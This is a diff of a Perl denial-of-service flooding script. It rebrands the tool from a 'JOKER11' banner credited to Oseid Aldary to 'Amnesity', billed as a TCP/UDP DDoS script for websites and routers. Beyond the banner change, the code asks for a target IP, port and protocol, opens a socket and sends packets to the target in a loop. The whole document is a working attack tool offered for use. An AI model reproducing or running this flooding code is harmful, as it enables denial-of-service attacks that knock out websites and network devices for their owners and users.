@@ -3,29 +3,22 @@
 use IO::Socket;
 system("clear || cls");
 #Script Banner================================================================
-print q{
-                   .-"      "-.
-                  /            \
-                 |    JOKER11   |
-                 |,  .-.  .-.  ,|
-                 | )(__/  \__)( |
-                 |/     /\     \|
-       (@_       (_     ^^     _)
-  _     ) \_______\__|IIIIII|__/__________________________
- (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_>
-        )_/        \          /
-       (@           `--------` Welcome!
-
- [---]   by:> OSEID ALDARY   [---]
- [---]   Version:> 1.5	     [---]
-};
-# INPUT TARGET INFO ==============================================
+print "
+   ###    ##     ## ##    ## ########  ######  #### ######## ##    ## 
+  ## ##   ###   ### ###   ## ##       ##    ##  ##     ##     ##  ##  
+ ##   ##  #### #### ####  ## ##       ##        ##     ##      ####   
+##     ## ## ### ## ## ## ## ######    ######   ##     ##       ##    
+######### ##     ## ##  #### ##             ##  ##     ##       ##    
+##     ## ##     ## ##   ### ##       ##    ##  ##     ##       ##    
+##     ## ##     ## ##    ## ########  ######  ####    ##       ##   
+- Strong/Efficient Modernized TCP/UDP DDoS Attack Script Created By: vConzv
+- Works As A Strong DDoS Attack Script On Both Websites As Well As Routers.\n";
 print "\n===============================";
 print "\n[~] Enter TargetIP: "; # Set Target IP
 $host = <STDIN>;
 chomp ($host);
 while ($host eq ""){
- print "   [!] Enter TargetIP?: ";
+ print "   [!] Set TargetIP?: ";
  $host = <STDIN>;
  chomp ($host);
 }
@@ -41,11 +34,11 @@ while ($port eq ""){
 }
 print "PORT ==> $port";
 print "\n===============================";
-print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
+print "\n[~] Set Protocol (TCP or UDP) :"; # Set Protockol;
 $proto = <STDIN>;
 chomp ($proto);
 while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
- print "   [!] Enter Protockol (TCP or UDP) ?: ";
+ print "   [!] Set Protocol (TCP or UDP) ?: ";
  $proto = <STDIN>;
  chomp ($proto);
 }
@@ -56,11 +49,11 @@ sleep(2);
 $sock = IO::Socket::INET->new (
         PeerAddr => $host,
         PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Error: Connection Faild To Target[ $host ] !!!\n[!] Please Check Your Intenet Connection !\n[!] OR Mabye The Problem From TARGET Side !\n";
+        Proto => "$proto" ) || die "\n[!] Error: Connection To Selected Target Faild[ $host ] !!!\n[!] Please Check Your Intenet Connection !\n[!] OR Mabye The Problem From TARGET Side !\n";
 }
 
 system("clear || cls");
-print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
+print "\n[*] Amnesity Is Sending Packets To Target [$host:$port] proto => [$proto].......\n\n";
 sleep(3);
 
 packets:
@@ -78,13 +71,5 @@ print " (=>$host:$port~$proto<=)";
 send($sock, $size, $size); # Attack start################
 
 }
-
-##############################################################
-#####################                #########################
-#####################  END OF SCRIPT #########################
-#####################                #########################
-##############################################################
-#This Script by Oseid Aldary
-#Have a nice day :)
-#GoodBye
+print " Thank You For Using Amnesity As Your Preffered DDoS Tool\n";
 
